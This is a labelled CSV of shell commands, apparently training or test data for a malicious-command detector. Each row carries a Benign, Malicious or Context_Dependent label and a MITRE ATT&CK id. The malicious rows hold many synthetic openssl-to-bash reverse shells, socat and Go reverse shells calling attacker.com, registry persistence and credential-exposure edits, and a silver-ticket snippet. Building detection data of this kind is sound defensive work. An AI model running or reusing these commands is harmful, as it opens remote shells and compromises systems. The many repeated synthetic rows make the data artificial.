command,label,original_label,mitre_id
tcpdump -i enp0s3 -w /tmp/.task,Context_Dependent,Synthetic,Synthetic
"echo -e ""$(TZ=GMT+30 date +%Y-%m-%d)\n$(TZ=GMT+20 date +%Y-%m-%d)"" | grep -v $(date +%Y-%m-%d) | tail -1",Benign,Benign,Benign
java -jar application.jar,Benign,Synthetic,Synthetic
ansible-pull [-U|--url] repository_url playbook,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:143,Malicious,Synthetic,Synthetic
find ${INPUT_LOCATION} -name '*.pdf.marker' -exec sh -c 'mv $0 `dirname $0`/`basename $0 .marker` $1' {} ${OUTPUT_LOCATION} \;,Benign,Benign,Benign
seq 1 10000 | head -1,Benign,Benign,Benign
dirs -v,Benign,Benign,Benign
sshd,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ps aux --sort=-%cpu | head -10,Benign,Synthetic,Synthetic
ssh -w 0:0 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
standard-version --dry-run,Benign,Benign,Benign
tcpdump -i enp0s3 -w /tmp/.sync,Context_Dependent,Synthetic,Synthetic
skills [a|add] owner/repo,Benign,Benign,Benign
gh api [-X|--method] POST endpoint,Benign,Benign,Benign
ls -l | more,Benign,Benign,Benign
clusters:,Malicious,Malicious,T1059
meshlabserver -i input.x3d -o output.x3d -s filter_script.mlx -l logfile,Benign,Benign,Benign
apm install package,Benign,Benign,Benign
apptainer verify [-g|--group-id] group_id path/to/image.sif,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.25:80 root@internal.corp,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
tcpdump -i ens33 -w /tmp/.sync,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
_objc_getClass(),Malicious,Malicious,T1129
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:110,Malicious,Synthetic,Synthetic
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.50:7777",Malicious,Synthetic,Synthetic
find lpi104-6 -samefile lpi104-6/file1,Benign,Benign,Benign
ng [n|new] app_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:53 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"find . -type f |xargs ls -lS |head -20 | awk '{print $9, $5}'",Benign,Benign,Benign
msxsl.exe {PATH:.xml} {PATH:.xsl},Malicious,Malicious,T1220
ssh -fN -L 8080:10.10.10.50:80 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
pip download package,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:995 user@10.0.0.50,Context_Dependent,Synthetic,Synthetic
ouch decompress path/to/archive1.tar path/to/archive2.tar.gz ...,Benign,Benign,Benign
echo User Domain: %USERDOMAIN% >> %file%,Context_Dependent,Malicious,T1033
csslint file.css,Benign,Benign,Benign
sudo lastb [-p|--present] hh:mm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:4444,Malicious,Synthetic,Synthetic
npm [x|exec] --quiet command argument1 argument2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
rails routes [-g|--grep] posts_path|GET|/posts,Benign,Benign,Benign
git check-ref-format refs/head/refname,Benign,Benign,Benign
tcpdump -i enp0s3 -c 100,Context_Dependent,Synthetic,Synthetic
"openclaw agent [-m|--message] ""Ship checklist""",Benign,Benign,Benign
"echo ""[Service]"" >> $systemd_service_path/$systemd_service_file",Malicious,Malicious,T1543
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:9090,Malicious,Synthetic,Synthetic
"socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane",Malicious,Malicious,T1059
molecule matrix converge,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:445 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
restic [-r|--repo] path/to/repository snapshots,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
"ocamlfind ocamlc -package package1,package2,... -linkpkg -o path/to/executable path/to/source.ml",Benign,Benign,Benign
ooniprobe run websites --input-file path/to/my-websites.txt,Benign,Benign,Benign
ansible-galaxy role|collection list,Benign,Benign,Benign
ac -p,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
evil-winrm [-i|--ip] ip_address [-u|--user] user [-H|--hash] nt_hash,Benign,Benign,Benign
find . -name a\*.html,Benign,Benign,Benign
mupdf -r 72 path/to/file,Benign,Benign,Benign
HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest,Malicious,Malicious,T1112
ibmcloud target --unset-region,Benign,Benign,Benign
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi,Malicious,Malicious,T1037
xed --create path/to/file1 path/to/file2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
nproc --ignore count,Context_Dependent,Benign,Benign
eksctl create cluster --name=name --nodes=4 --auto-kubeconfig,Benign,Benign,Benign
pacstall [-L|--list],Benign,Benign,Benign
"find . -type f -name ""*.gz"" -exec zgrep 'GET /foo' {} \;",Benign,Benign,Benign
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1 /f",Malicious,Malicious,T1112
az login [-i|--identity] [-u|--username] /subscriptions/subscription_id/resourcegroups/my_rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/my_id,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
cscript ospp.vbs /inpkey:product_key,Benign,Benign,Benign
"find . -regex "".*/(test)[0-9][0-9]\.txt""",Benign,Benign,Benign
"New-Item -Path ""HKCU:\Software\Classes\CLSID\$clsid_guid\InprocServer32"" -Value ""$file_name"" -Force | Out-Null",Malicious,Malicious,T1574
nvcc path/to/source.cu [-o|--output-file] path/to/executable [-g|--debug] [-G|--device-debug],Benign,Benign,Benign
"stat [-c|--format] ""%a %n"" path/to/file",Benign,Benign,Benign
ufraw-batch --out-type=jpg input_file(s),Benign,Benign,Benign
ykinfo -c,Benign,Benign,Benign
rails new [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.0.50:4444 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
Set-NodeVersion node_version -Persist Machine,Benign,Benign,Benign
opencode uninstall [-d|--keep-data],Benign,Benign,Benign
mvn dependency:resolve,Benign,Benign,Benign
cat ~/.bashrc | pbcopy,Benign,Benign,Benign
cp -Rvn /source/path/* /destination/path/,Benign,Benign,Benign
solo monitor path/to/serial_port,Benign,Benign,Benign
"setcap 'cap_dac_read_search,cap_sys_tty_config+ep' path/to/file",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:3306,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
tldr todo,Benign,Benign,Benign
procstat vm pid,Benign,Benign,Benign
uuencode -o path/to/output_file path/to/input_file output_file_name_after_decoding,Benign,Benign,Benign
lsd [-F|--classify],Benign,Benign,Benign
rc-status [-a|--all],Benign,Benign,Benign
at hh:mm,Benign,Benign,Benign
tcpdump -i eth0 host 10.0.0.100,Context_Dependent,Synthetic,Synthetic
json5 [-h|--help],Benign,Benign,Benign
clip-view path/to/page1.clip path/to/page2.clip ...,Benign,Benign,Benign
find . -type d -maxdepth 1 -empty -print0 | xargs -0 /bin/rmdir,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
readlink -f $(which firefox),Benign,Benign,Benign
ri File#read,Benign,Benign,Benign
crane export image_name -,Benign,Benign,Benign
mariadb db_name,Benign,Benign,Benign
find /usr/src -name '*.c' -size +100k -print,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9002,Malicious,Synthetic,Synthetic
host google.com,Benign,Synthetic,Synthetic
tcpdump -i ens33 port 110,Context_Dependent,Synthetic,Synthetic
svg2png [-w|--width] 800 path/to/file.svg path/to/output.png,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
ncat --listen --keep-open -p 8080,Context_Dependent,Synthetic,Synthetic
psysh [-c|--config] path/to/file,Benign,Benign,Benign
find . -maxdepth 1 -type d -exec ls -dlrt {} \; | wc --lines,Benign,Benign,Benign
unzip -O gbk path/to/archive1.zip path/to/archive2.zip ...,Benign,Benign,Benign
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run,Malicious,Malicious,T1547
tldr snap.pkg,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:5432,Malicious,Synthetic,Synthetic
pyinfra path/to/target_list.py path/to/deploy.py,Benign,Benign,Benign
fscrypt setup path/to/directory,Benign,Benign,Benign
"yad --entry --text ""message""",Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.25:3389 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
mongod --config path/to/file,Benign,Benign,Benign
smbclient.py -outputfile path/to/output_file domain/username:password@target,Benign,Benign,Benign
packtpub view-offer,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:8888 operator@10.20.30.40,Context_Dependent,Synthetic,Synthetic
pamfile [-a|-allimages] -machine path/to/file,Benign,Benign,Benign
"""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat",Malicious,Malicious,T1558
swig -go -cgo -intgosize 64 -c++ path/to/swig_file.i,Benign,Benign,Benign
ippfind --txt-pdl application/postscript [-h|--host] regex [-x|--exec] ipptool -f onepage-letter.ps '{}' print-job.test \;,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.100:9090 support@internal.corp,Context_Dependent,Synthetic,Synthetic
kinfocenter [-h|--help],Benign,Benign,Benign
josm --language de,Benign,Benign,Benign
ps [-u|--user] $(id [-u|--user]) f,Context_Dependent,Benign,Benign
inkmake [-v|--verbose] path/to/Inkfile,Benign,Benign,Benign
tcpdump -i wlan0,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
find $backup_path/* -name *.sql -mtime +30 -exec rm {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3306,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
ncc clean cache,Benign,Benign,Benign
sui client gas address,Benign,Benign,Benign
ssh -fN -L 8080:172.20.10.8:80 admin@192.168.1.100,Context_Dependent,Synthetic,Synthetic
kscreen-doctor [-o|--outputs],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:4445,Malicious,Synthetic,Synthetic
find data/ -name filepattern-*2009* -print > filesOfInterest.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
kk_KZ,Context_Dependent,Malicious,T1614
"func_name() { echo ""Function contents here""; }",Benign,Benign,Benign
pass edit path/to/data,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:22,Malicious,Synthetic,Synthetic
apptainer inspect [-r|--runscript] path/to/image.sif,Benign,Benign,Benign
tcpdump -i ens160 -c 443,Context_Dependent,Synthetic,Synthetic
as @/path/to/input-file,Context_Dependent,Malicious,T1005
openssl s_client -quiet -connect 192.168.1.10:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
crane version [-h|--help],Benign,Benign,Benign
llvm-dis path/to/file.bc,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9002,Malicious,Synthetic,Synthetic
find /home/mywebsite/public_html/sites/all/modules -type f -exec chmod 640 {} +,Context_Dependent,Benign,Benign
"find ""$ORIG_DIR"" -name ""*"" -type f",Benign,Benign,Benign
echo $(basename $(dirname $(dirname $pathname))),Benign,Benign,Benign
nu --log-level error|warn|info|debug|trace path/to/script.nu,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.8:80 root@192.168.1.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
tcpdump -i ens33 port 9090,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9002,Malicious,Synthetic,Synthetic
journalctl -u docker --since '1 hour ago',Benign,Synthetic,Synthetic
"echo ""$(pwd)/$(basename ""$1"")""",Benign,Benign,Benign
which nginx,Benign,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.1:1433 svcuser@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
tar -I pbzip2 -cf OUTPUT_FILE.tar.bz2 /DIR_TO_ZIP/,Benign,Benign,Benign
"echo -e 'package main\nimport (\n\t""os""\n\t""net""\n\t""syscall""\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP(""attacker.com"").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, os.Environ())\n}' >/path/to/temp-file.go",Malicious,Malicious,T1059
pamac search package_name,Benign,Benign,Benign
dub init project_name [-n|--non-interactive],Benign,Benign,Benign
taskkill /im process_name /t,Benign,Benign,Benign
"fs_cli [-x|--execute] ""show calls""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:3306,Malicious,Synthetic,Synthetic
mv /home/user/server.js.old /home/user/server.js,Benign,Synthetic,Synthetic
transmission-cli [-w|--download-dir] path/to/download_directory url|magnet|path/to/file,Benign,Benign,Benign
doskey /macros > path\to\macinit_file,Benign,Benign,Benign
tmux kill-session -t name,Benign,Benign,Benign
compress $* &,Benign,Benign,Benign
PutLifecycleConfiguration,Malicious,Malicious,T1485
"find . -type f -and -iname ""*.deb""",Benign,Benign,Benign
subfinder [-dL|-list] path/to/domains.txt | katana [-ct|-crawl-duration] value [-o|-output] path/to/output.txt,Benign,Benign,Benign
systemd-run [-p|--property] MemoryMax=memory_in_bytes [-p|--property] CPUQuota=percentage_of_CPU_time% --wait command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:4445,Malicious,Synthetic,Synthetic
scp -J proxy_username@proxy_host path/to/local_file remote_host:path/to/remote_file,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:443 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
pip lock [-r|--requirement] path/to/requirements.txt,Benign,Benign,Benign
sudo update-ca-certificates,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
